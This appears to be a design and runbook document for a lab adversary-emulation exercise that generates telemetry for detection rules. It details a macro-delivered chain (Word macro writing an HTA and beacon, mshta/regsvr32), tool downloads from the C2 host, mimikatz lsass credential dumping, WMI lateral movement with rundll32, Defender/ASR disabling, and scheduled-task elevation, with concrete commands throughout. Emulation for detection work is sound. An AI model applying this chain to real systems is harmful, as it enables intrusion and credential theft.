# Initial Access Chain — Design (remote operator, macro-only delivery, WMI→rundll32)

Status: **DESIGN** (awaiting access approval: vmrun credentials, Elastic credentials, it.admin, station, docm automation).
Reference run: `RUN-20260930-01` (ledger + telemetry: `../../docs/telemetry-comparison-c0015-vs-lab.md`,
`../phase2-operator/operator-phase-context-gaps-runbook.md`).

## 0. Objectives

1. **100% remote operator** — no commands typed on the WS01/FS01 console. Every operator
   technique (S4–S9) is driven from the operator station (C2 host 192.168.50.1) through C2-SIM
   tasking + WMI DCOM (T1047), matching the "remote attacker" profile.
2. **Delivery from the Word macro only** — before the victim opens `test.docm`, the WS01 disk
   holds NO tooling; the macro generates config/HTA/beacon itself; the DLL and the phase-2 tools
   arrive over HTTP `:8000` (T1105), never staged directly.
3. **G2 — `wmiprvse→rundll32→143.dll`**: diagnose again and remediate (see §2 — the "ReturnValue=9"
   suspicion is a quoting artifact, not a window-station restriction).
4. **G1 — Security ingest** into Elastic (if the user grants ES access): enable
   4624/4625/4648/4672/5140/5145.
5. **G8 — C2-SIM watchdog** (auto-restart); **G4 — capture E3 `:8000`** in verification;
   G3/G5/G6/G7 rule directions updated according to new results.

## 1. New findings from the investigation (design impact)

| # | Finding | Evidence | Consequence |
|---|---|---|---|
| N1 | **"ReturnValue=9 for ALL DLLs" has a proof gap**: every with-DLL test went through `wmic` with a `\"...\"` string (cmd-style quote escaping that is invalid → command line mangled → CreateProcess path error). `rundll32-alone=0` shows rundll32 is NOT blocked in session-0 (it runs by itself). A clean diagnostic via `Invoke-CimMethod` produced no ledger-recorded result. | ledger `RUN-20260930-01` S8b notes; `user32.dll,MessageBeep` diagnostic; `pivot_cim.txt`/`pivot_wmic.txt` | New hypothesis: **G2 may be resolved with a clean command line (no nested quoting, no wmic through cmd)** — the diagnostic matrix in §4.2 must run before concluding |
| N2 | C2-SIM stopped at 03:04:38Z right after `result T-BEACON-SLEEP ok` — **no traceback in the log** (stderr hidden due to `-WindowStyle Hidden`) | `c2sim.log` | The watchdog (G8) must not only respawn but also record stderr; investigate the cause when it recurs |
| N3 | **Residue of previous runs**: the WS01 beacon (`S1-799c8731a354c9ad`, live) has been polling C2-SIM since 01:09:25 (manual restart); `stage/ws01` still contains 143.dll/mimikatz/beacon/config; `build/out` is EMPTY | `c2sim.log`, `tasklist` | Before the run: clean up the stale beacon and rebuild the payloads into `build/out` |
| N4 | WS01 does not answer ICMP (firewall) although the VM is running (4 `vmware-vmx` processes); FS01/DC01/Kali answer ICMP | ping test | Use vmrun as the guest operation channel; WS01 needs the WMI inbound firewall rule so the operator can reach WS01 via WMI (S7b) |
| N5 | `vmrun` is available (VMware Workstation, 4 VMs running): `E:\VM\C0015\{DC01,WS01,FS01}`, Kali under a OneDrive path | host survey | Preflight, artifacts and the victim open can all be automated through vmrun (credentials pending) |
| N6 | Elastic 9200/8220 reachable from the host (Tailscale); **5601 (Kibana) closed**; SSH 22 open (key `elastic01-key.pem`); the repo holds no ES credentials (env `ES_USER/ES_PASS` previously) | port test | G1 via the Fleet/Kibana API needs an SSH tunnel or credentials (see §6) |

## 2. Remote-operator architecture (new)

### 2.1 Channel roles

| Channel | Used for | Not used for |
|---|---|---|
| **C2-SIM tasking** (`/cmd`, `/runbook`, `/results`) | S4/S5 discovery, tool downloads (S7b/S8a), WMI pivot (S8b), reading output | — |
| **WMI DCOM** from the C2 host (Invoke-CimMethod, it.admin credentials, `-Authentication Dcom`) | Elevating beacon-2 on WS01 (S7b); S7 logon probes (`4625`/`4624`/`4672` on FS01) | Routine operations (tasking is sufficient) |
| **vmrun** (host→guest) | One-time preflight (Defender/ASR/exclusions, WMI firewall, EnableLUA, icacls, Trust Center), copying the docm, opening the docm (victim action), artifact pull, cleanup | NOT for operator techniques (keeps telemetry clean) |
| **HTTP `:8000`** (attack infrastructure) | HTA DLL download (S1, already in place); beacon tasking `Invoke-WebRequest` fetches of mimikatz/143.dll/beacon2/config-phase7 (S7b/S8a, T1105) | — |

### 2.2 S4–S9 flow (Path A — camp-exact, recommended)

```text
C2 host ──tasking──> beacon-1 (WS01, duc.user)          S4  discovery (runbook of 11 commands, as before)
C2 host ──WMI DCOM (it.admin)──> WS01: wmiprvse→powershell
        = beacon-2 elevated (session-0, re-register SAME token)   S7b  elevated execution
beacon-2 ──tasking──> download mimikatz (http :8000) ──> E11 + E3 :8000 (G4)
beacon-2 ──tasking──> mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
                       ──> E10 lsass 0x1010 (source = wmiprvse→powershell→mimikatz chain) + output via /results
beacon-2 ──tasking──> download 143.dll + beacon + config-phase7 (:8000)      S8a
beacon-2 ──tasking──> copy → \\FS01\C$\C0015\            ──> FS01 E11 (+ S5145 once G1 is done)
beacon-2 ──tasking──> WMI DCOM → FS01 CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'
                        ──> FS01 wmiprvse→rundll32→143.dll→marker+beacon-3   S8b (original T1047)
beacon-3 (FS01) ──> register phase7-session2 ──> receipt ART-07-01           S9
```

Expected telemetry per step (detailed table in §5.2). Difference from the previous runs:
**the WS01 console is dropped entirely** (S0 runas seeding, runas mimikatz, runas wmic) — every hop
is network-native, as in the campaign.

### 2.3 Path B (fallback, if WMI→WS01 is blocked)

If WS01 blocks inbound WMI (firewall cannot be opened): elevate beacon-2 via a **scheduled task**
(`schtasks /create ... /ru it.admin /it`) from beacon-1 → parent = svchost (Task Scheduler), recorded
as G7a; or WMI from the C2 host straight to FS01 (skip the WS01→FS01 hop, mark "pivot from WS01" as PARTIAL).

## 3. Delivery redesign — no tools staged on the machine

### 3.1 S1–S3: macro self-generates the whole stage

| Before (earlier runs) | After (current) |
|---|---|
| `stage_ws01.ps1` copies config.ini + bootstrap.hta + beacon into `%PUBLIC%\C0015\` (staged directly) | The macro (embedded b64) **writes** `config.ini` + `bootstrap.hta` + `c0015_beacon.ps1` itself into `%PUBLIC%\C0015\`, then launches mshta |
| DLL from `:8000` at runtime | KEPT (already camp-accurate: T1105/T1036) |

- Before the docm is opened: the WS01 disk holds only `test.docm` (+ the operating system).
- Implementation: `payloads/packaging/gen_macro_embedded.ps1` — reads `config.ini` (make_config) +
  `bootstrap.hta` + `c0015_beacon.ps1` → base64 → transforms `payloads/docm/macro_payload.vba` →
  `stage/ws01/macro_embedded.vba` (adds `Sub WriteFiles(): ... ADODB.Stream ...` called before
  `RunEntry`). The VBA module is ~15KB — under the limit.
- `install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba` (the verified COM-inject
  mechanism is unchanged).

### 3.2 S7b/S8a: tools via T1105

- `:8000` additionally publishes `tools/` (`mimikatz.exe`, `c0015_143_surrogate.dll`,
  `c0015_beacon.ps1`, `config-phase7.ini` — these are attack-infrastructure files and never sit on
  the WS01 disk before beacon-1 exists).
- Beacon tasking: `powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/<f> -OutFile C:\ProgramData\C0015\<f>"`
  → E11 (FileCreate) + E3 (`:8000`) — the exact T1105 staging signature; closes G4.

## 4. Specific remediations (in-repo code)

| Gap | Remediation | File |
|---|---|---|
| G8 | c2sim watchdog: respawn + port healthcheck + stderr capture | `scripts/c2sim_guard.py` (new), `payloads/packaging/launch_servers.ps1` (runs the guard instead of c2sim directly; `-Stop` kills guard + child) |
| G2 | Diagnostic matrix (6 variants) before concluding; if a variant using `Invoke-CimMethod`/clean wmic returns 0 → **retract the "window-station constraint"** everywhere, and S8b switches to real rundll32 | `stage/analysis/wmi_rundll32_diag.ps1` (new) |
| G4 | Verification adds: E3 `:8000` (S1 DLL + S7b/S8a tool fetches) + check of the `logs-windows.security-*` index | `stage/analysis/verify_run_evidence.py` |
| G1 | Fleet policy `C0015-Windows-Endpoints`: add the `windows.security` input (channel Security) — via Kibana/Fleet API (SSH tunnel to ELASTIC01) | documented in `../../docs/architecture.md` (written once credentials exist) |
| G3 | Keep the E10 rule (0x1010/0x1fffff, non-system source); record the new source (wmiprvse chain) | docs update |
| G6/G5 | Rules use `process.entity_id` + parent, deduplicated by entity | docs update |

## 5. Run procedure (machine-specific; to be verified once access is granted)

### 5.0 Residue cleanup (before P0)

- [C2] `-Action Stop` (kill the old C2-SIM pid 13852 + http.server) → check whether the old WS01
  beacon still polls; if so, kill it via vmrun (`listProcessesInGuest` → kill the powershell beacon pid).
- [C2] `Remove-Item stage\ws01\*` (remove artifacts of earlier runs); rebuild `build/out`.
- [WS01/FS01] remove `C:\C0015`, `C:\Tools\mimikatz.exe`, `C:\stage` (leftovers of earlier runs).

### 5.1 P0 — preflight (one-time, automated via vmrun + a few manual gates)

| Machine | Step | Channel |
|---|---|---|
| C2 | `preflight_vmrun.ps1` initializes the credential file (DPAPI clixml, gitignored) | manual once |
| Kali | build the DLL (`build_dll.sh` + 143.dll) or copy an existing binary; `john` (already present) | SSH/vmrun |
| WS01 | it.admin ∈ Administrators; EnableLUA=0 + reboot (vmrun reset); **WMI inbound firewall open** (new — for S7b); Defender: Tamper OFF → ASR `d1e49aac` OFF + RTM off + exclusions; Word Trust Center: `VBAWarnings=1`, `AccessVBOM=1`, ProtectedView off | vmrun (admin) |
| FS01 | it.admin ∈ Administrators; WMI firewall open (already set); `icacls C:\C0015 Everyone:F`; Defender as above | vmrun |
| C2/WS01/FS01 | Elastic agent healthy (check Fleet) | ES API |

### 5.2 P1 — entry (the only victim action)

1. [C2] `-Action Pre` (servers up, config + embedded vba generated; check BOTH listeners on 2 ports).
2. [WS01] (vmrun, duc.user) `install_macro_docm.ps1 -MacroSource macro_embedded.vba` → Desktop/test.docm.
3. [WS01] (vmrun, duc.user) `cmd /c start test.docm` → macro runs → S1–S3 (macros enabled via Trust
   Center; no "Enable Content" click needed — lab-config note).
4. [C2] `-Action WaitSession` → `-Action P1`.

Expected S1–S3 telemetry (unchanged): E1 `WINWORD→mshta→regsvr32` + E3 `:8000` (DLL) + E1 beacon + E3 `:8080`.

### 5.3 P2 — remote operator

| # | Step | Command / channel | Expected evidence |
|---|---|---|---|
| 1 | S4 discovery | C2 `-Action P2` (runbook c0015-phase2) | E1 child of beacon (WS01) |
| 2 | S5 shares | `-Action Run -Body 'net view \\FS01'` + Get-SmbShare | E1 + E11 found_shares (WS01) |
| 3 | S7 logon probes (Path A) | C2 `Invoke-CimMethod -ComputerName FS01 -Credential duc.user(wrong)` → fails; `-Credential it.admin` → ok | FS01 **S4625** (460, 424) once G1; for S4648 keep 1 interactive `net use B` step (see §7 Q4) |
| 4 | S7b elevate beacon-2 | C2 `Invoke-CimMethod -ComputerName WS01 -Credential it.admin` CommandLine=`powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini` | WS01 E1 **wmiprvse→powershell** (elevated, token re-registered) + FS01 4624 on the next hop |
| 5 | S7b mimikatz | beacon-2 tasking: download+mimikatz `"privilege::debug" "sekurlsa::logonpasswords" "exit"` → read `/results` → crack (john) / provisioned | WS01 E11 mimikatz + **E10 lsass 0x1010 non-system source** + E3 `:8000` |
| 6 | S8a handoff | beacon-2 tasking: download 143.dll+beacon+config-phase7 → `copy` → `\\FS01\C$\C0015\` | WS01 E11 + FS01 E11 (+ S5145 once G1) |
| 7 | S8b WMI pivot | beacon-2 tasking: `New-CimSession -ComputerName FS01 -Authentication Dcom; Invoke-CimMethod ... CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'` (check the §4.2 diagnostics first) | **FS01 E1 wmiprvse→rundll32** + E7 143.dll hash=ART-06-01 + E11 marker + 4624 T3 |
| 8 | S9 session-2 | beacon-3 register phase7-session2 | receipt **ART-07-01-<token>** + E3 FS01→:8080 |

### 5.4 Q — verify + cleanup

- Elastic: `verify_run_evidence.py` (v2: adds :8000 + security) → `run-window-evidence.md`.
- Cleanup: kill beacons (vmrun), `-Action Stop`, re-enable Defender/ASR/firewall, remove C:\C0015/C:\Tools/stage.

## 6. G1 — Security ingest (details; credentials pending)

1. Tunnel: `ssh -i elastic01-key.pem <user>@100.77.46.126 -L 5601:localhost:5601` (SSH user to be determined).
2. Fleet API: `GET /api/fleet/agent_policies?kuery=names:"C0015-Windows-Endpoints"` → `POST /api/fleet/package_policies`
   (package `windows`, input eventlog, dataset `windows.security`, channel `Security`, namespace `c0015`).
3. Wait for the agent reload (a few minutes) → verify `GET .ds-logs-windows.security-*/_search` returns 4624/4625/4672/5145.
4. Update the `verify_run_evidence.py` queries to the new index; join `winlog.logon.id` (4624) ↔ E10/E1 when needed.

## 7. Open items — decisions requested from the user (each with a question)

| Q | Issue | Proposed choice |
|---|---|---|
| Q1 | vmrun needs guest credentials (user/pass on the command line — lab-only) | Create `C0015\labops` admin (WS01/FS01) + local labops (DC01/Kali) — lab-only password, gitignored; or reuse the existing credentials |
| Q2 | Elastic: `ES_USER/ES_PASS` (+ SSH user for the key) | Provide so I can verify and complete G1 (Fleet API) |
| Q3 | it.admin password used for S7/S8 | Provide (lab) — used via DPAPI clixml, NEVER in the repo/cmdline telemetry; S7 interactive optional |
| Q4 | Station/diagnostics: Path A (recommended) vs B; docm opened automatically (vmrun) vs manually | Path A + vmrun open |

## 8. Rule pointers (planned updates after the run)

- S8b: if G2 is retracted → the `E1 parent=wmiprvse & child=rundll32 & E7 unsigned-DLL` rule returns
  (camp-accurate); keep the fallback behavior-rule (E7+E3) for the loader host (G7).
- S7b: E10 lsass rule (0x1010/0x1fffff, non-system) — the new source is the wmiprvse→powershell→mimikatz chain.
- S7/S8a: once G1 is done → S4624 T3 it.admin→FS01 rule + S5145 C$ write + LogonId join.
- G5/G6: every count-rule anchored on `process.entity_id` (dedup), no raw counts.

## 9. Objective #3 investigation — macro self-write of the staged files (2026-10-02, results)

**Objective**: before the victim opens the file, WS01 holds no tooling — the macro in test.docm
writes config.ini + bootstrap.hta + c0015_beacon.ps1 itself (base64 embedded in VBA) into %PUBLIC%\C0015.

**Method**: built 3 diagnostic documents (diag1 COM / diag2 chunked-const / diag3 native-I/O
Open/Put) opened through an interactive scheduled task; clean-slate test (seeds removed → the real
test.docm opened).

**Results (verified on Elastic + guest + Application log)**:
- Word via VIX (vmrun) → NEVER runs the macro (0 events, even the native-I/O variant).
- Word via an interactive scheduled task → runs sometimes and sometimes not (E1 WINWORD→mshta seen
  at 02:25/03:20/03:45/03:53; d6 opened at 03:56 with zero actions). Macro execution **depends on
  the Word instance** — the failure is not in the WriteFiles code.
- The Application log shows no Word errors (no crash/dialog logged); VBAWarnings/AccessVBOM/ProtectedView
  were all set.
- d5 (test.docm with pub wiped) → beacon registered at 03:53:36 — suggesting WriteFiles can run on a
  clean slate, though not yet reproducible.
- diag3 (native I/O) also produced 0 output on the non-running instance ⇒ the problem sits at the
  "does the macro run at all" layer, not in the write code.

**Conclusion**: the reliable mode is the seed fallback (proven many times). For "entry 100% from
the macro": the console UI of Word in the duc.user session must be observed (to catch a hidden
dialog / first-run prompt) or a manual open used; the WriteFiles code was rewritten toward native
I/O (COM-failure resistant) and is ready for re-validation.

## 10. Objective #3 — document self-generates the full payload set: RESOLVED (2026-10-02, verified)

Proof run 05:05Z: opened c0015_entry.docm (manual victim open, auto-macro) →
the macro (AutoOpen, standard module) writes config.ini(1734)/bootstrap.hta(4358)/c0015_beacon.ps1(6093)
itself (E11 proc=WINWORD) → mshta runs the HTA → downloads c0015-comparefor.jpg(90407) → regsvr32 →
dll-executed → beacon registers phase3 (token a7d4f6e1, ok=True). c0015wf.log records every WriteFiles
step, err=0.

Four root causes remediated (commit 422ed91):
1. the installer uses `$doc.VBProject` instead of `$word.VBE.ActiveVBProject` (previously the project
   landed in Normal.dotm → the docm was saved macro-less);
2. injection into a STANDARD MODULE 'c0015Payload' (ThisDocument derives from Document → member
   collision → "member already exists");
3. the module emission was rewritten cleanly in the generator (no junk after End Sub; `sh.Run`
   quote-soup → `sh.Run mshtaPath & " " & htaPath, 0, False`);
4. trigger = single `Public Sub AutoOpen()` (standard module).

Lab requirements to remember: victim open is MANUAL (interactive Word session), the Word state must
be clean (delete Resiliency/DocumentRecovery after a crash before opening), auto-macros enabled.
Note: occasionally mshta shows a transient "script error: write to file failed (code 0)" while
writing the marker, but the file is written successfully anyway (confirmed by E11) and the script
continues.
